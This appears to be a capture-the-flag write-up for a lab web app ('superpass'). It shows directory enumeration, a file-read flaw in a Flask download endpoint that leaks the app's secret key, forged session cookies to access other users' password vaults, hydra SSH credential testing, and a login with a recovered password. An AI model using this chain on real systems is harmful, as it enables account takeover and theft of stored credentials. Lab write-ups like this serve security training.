Web enumeration
```bash
$ feroxbuster --url http://superpass.htb/ --wordlist /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://superpass.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
302        5l       22w      249c http://superpass.htb/download
301        7l       12w      178c http://superpass.htb/static
301        7l       12w      178c http://superpass.htb/static/js
301        7l       12w      178c http://superpass.htb/static/css
301        7l       12w      178c http://superpass.htb/static/img
302        5l       22w      243c http://superpass.htb/vault
200       73l      154w     3082c http://superpass.htb/account/login
302        5l       22w      189c http://superpass.htb/account/logout
200       73l      151w     3058c http://superpass.htb/account/register
[####################] - 1m    311400/311400  0s      found:6       errors:0      
[####################] - 1m     62280/62280   599/s   http://superpass.htb/
[####################] - 19s    62280/62280   3229/s  http://superpass.htb/static
[####################] - 19s    62280/62280   3243/s  http://superpass.htb/static/js
[####################] - 19s    62280/62280   3266/s  http://superpass.htb/static/css
[####################] - 19s    62280/62280   3247/s  http://superpass.htb/static/img
```


After careful check and verification, there's an LFI vulnerability on the endpoint `/download?fn=`
![[Pasted image 20230305022719.png]]

``` /etc/passwd

```

Some interesting files:
```
/app/app/superpass/views/vault_views.py

```

vault_views.py
```python
import flask
import subprocess
from flask_login import login_required, current_user
from superpass.infrastructure.view_modifiers import response
import superpass.services.password_service as password_service
from superpass.services.utility_service import get_random
from superpass.data.password import Password


blueprint = flask.Blueprint('vault', __name__, template_folder='templates')


@blueprint.route('/vault')
@response(template_file='vault/vault.html')
@login_required
def vault():
    passwords = password_service.get_passwords_for_user(current_user.id)
    print(f'{passwords=}')
    return {'passwords': passwords}


@blueprint.get('/vault/add_row')
@response(template_file='vault/partials/password_row_editable.html')
@login_required
def add_row():
    p = Password()
    p.password = get_random(20)
    #import pdb;pdb.set_trace()
    return {"p": p}


@blueprint.get('/vault/edit_row/<id>')
@response(template_file='vault/partials/password_row_editable.html')
@login_required
def get_edit_row(id):
    password = password_service.get_password_by_id(id, current_user.id)

    return {"p": password}


@blueprint.get('/vault/row/<id>')
@response(template_file='vault/partials/password_row.html')
@login_required
def get_row(id):
    password = password_service.get_password_by_id(id, current_user.id)

    return {"p": password}


@blueprint.post('/vault/add_row')
@login_required
def add_row_post():
    r = flask.request
    site = r.form.get('url', '').strip()
    username = r.form.get('username', '').strip()
    password = r.form.get('password', '').strip()

    if not (site or username or password):
        return ''

    p = password_service.add_password(site, username, password, current_user.id)
    return flask.render_template('vault/partials/password_row.html', p=p)


@blueprint.post('/vault/update/<id>')
@response(template_file='vault/partials/password_row.html')
@login_required
def update(id):
    r = flask.request
    site = r.form.get('url', '').strip()
    username = r.form.get('username', '').strip()
    password = r.form.get('password', '').strip()

    if not (site or username or password):
        flask.abort(500)

    p = password_service.update_password(id, site, username, password)

    return {"p": p}


@blueprint.delete('/vault/delete/<id>')
@login_required
def delete(id):
    password_service.delete_password(id)
    return ''


@blueprint.get('/vault/export')
@login_required
def export():
    if current_user.has_passwords:        
        fn = password_service.generate_csv(current_user)
        return flask.redirect(f'/download?fn={fn}', 302)
    return "No passwords for user"
    

@blueprint.get('/download')
@login_required
def download():
    r = flask.request
    fn = r.args.get('fn')
    with open(f'/tmp/{fn}', 'rb') as f:
        data = f.read()
    resp = flask.make_response(data)
    resp.headers['Content-Disposition'] = 'attachment; filename=superpass_export.csv'
    resp.mimetype = 'text/csv'
    return resp
```

password.py
```python
import datetime
import sqlalchemy as sa
from  sqlalchemy import orm
from superpass.data.modelbase import SqlAlchemyBase

class Password(SqlAlchemyBase):
    __tablename__ = "passwords"

    id = sa.Column(sa.Integer, primary_key=True, autoincrement=True)
    created_date = sa.Column(sa.DateTime, default=datetime.datetime.now)
    last_updated_data = sa.Column(sa.DateTime, default=datetime.datetime.now)
    url = sa.Column(sa.String(256))
    username = sa.Column(sa.String(256))
    password = sa.Column(sa.String(256))
    
    user_id = sa.Column(sa.Integer, sa.ForeignKey("users.id"))
    user = orm.relation('User')

    def __repr__(self):
        return f'<Password {self.url}: {self.username} / {"*" * len(self.password)}>'


    def get_dict(self):
        return {"url": self.url, "username": self.username, "password": self.password}
```

app.py
```python
import json
import os
import sys
import flask
import jinja_partials
from flask_login import LoginManager
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from superpass.infrastructure.view_modifiers import response
from superpass.data import db_session

app = flask.Flask(__name__)
app.config['SECRET_KEY'] = 'MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD'


def register_blueprints():
    from superpass.views import home_views
    from superpass.views import vault_views
    from superpass.views import account_views
    
    app.register_blueprint(home_views.blueprint)
    app.register_blueprint(vault_views.blueprint)
    app.register_blueprint(account_views.blueprint)


def setup_db():
    db_session.global_init(app.config['SQL_URI'])


def configure_login_manager():
    login_manager = LoginManager()
    login_manager.login_view = 'account.login_get'
    login_manager.init_app(app)

    from superpass.data.user import User

    @login_manager.user_loader
    def load_user(user_id):
        from superpass.services.user_service import get_user_by_id
        return get_user_by_id(user_id)


def configure_template_options():
    jinja_partials.register_extensions(app)
    helpers = {
        'len': len,
        'str': str,
        'type': type,
    }
    app.jinja_env.globals.update(**helpers)


def load_config():
    config_path = os.getenv("CONFIG_PATH")
    with open(config_path, 'r') as f:
        for k, v in json.load(f).items():
            app.config[k] = v


def configure():
    load_config()
    register_blueprints()
    configure_login_manager()
    setup_db()
    configure_template_options()


def enable_debug():
    from werkzeug.debug import DebuggedApplication
    app.wsgi_app = DebuggedApplication(app.wsgi_app, True)
    app.debug = True


def main():
    enable_debug()
    configure()
    app.run(debug=True)


def dev():
    configure()
    app.run(port=5555)


if __name__ == '__main__':
    main()
else:
    configure()
```


I proceeded to sign a cookie for getting more credentials using LFI + Flask sign function

```
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME'

```

secret
MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD

```cookie
{'_flashes': [('message', 'Please log in to access this page.')], '_fresh': True, '_id': '49db19ffeb8d7784424fd0cc587cadaa6adf43aab766b45eb9155904a9a356c64f0598e29fa68221cc2e9939547fe9069d5a87e1a6f68632da8a04915785097c', '_user_id': '1'}
```

```
flask-unsign --sign --cookie "{'_flashes': [('message', 'Please log in to access this page.')], '_fresh': True, '_id': '49db19ffeb8d7784424fd0cc587cadaa6adf43aab766b45eb9155904a9a356c64f0598e29fa68221cc2e9939547fe9069d5a87e1a6f68632da8a04915785097c', '_user_id': '2'}" --secret 'MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD'
```



```bash
$ hydra -C hashes superpass.htb ssh
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-05 07:14:24
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 5 tasks per 1 server, overall 5 tasks, 5 login tries, ~1 try per task
[DATA] attacking ssh://superpass.htb:22/
[22][ssh] host: superpass.htb   login: corum   password: 5db7caa1d13cc37c9fc2
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-05 07:14:28

$ ssh corum@superpass.htb 
The authenticity of host 'superpass.htb (10.129.28.160)' can't be established.
ECDSA key fingerprint is SHA256:1d/DkiEPb/QoZOLY+A6kshu7guo3ujbXS4B74jrYUM8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'superpass.htb,10.129.28.160' (ECDSA) to the list of known hosts.
corum@superpass.htb's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-60-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

Last login: Thu Mar  2 08:06:55 2023 from 10.10.14.40
corum@agile:~$ 

```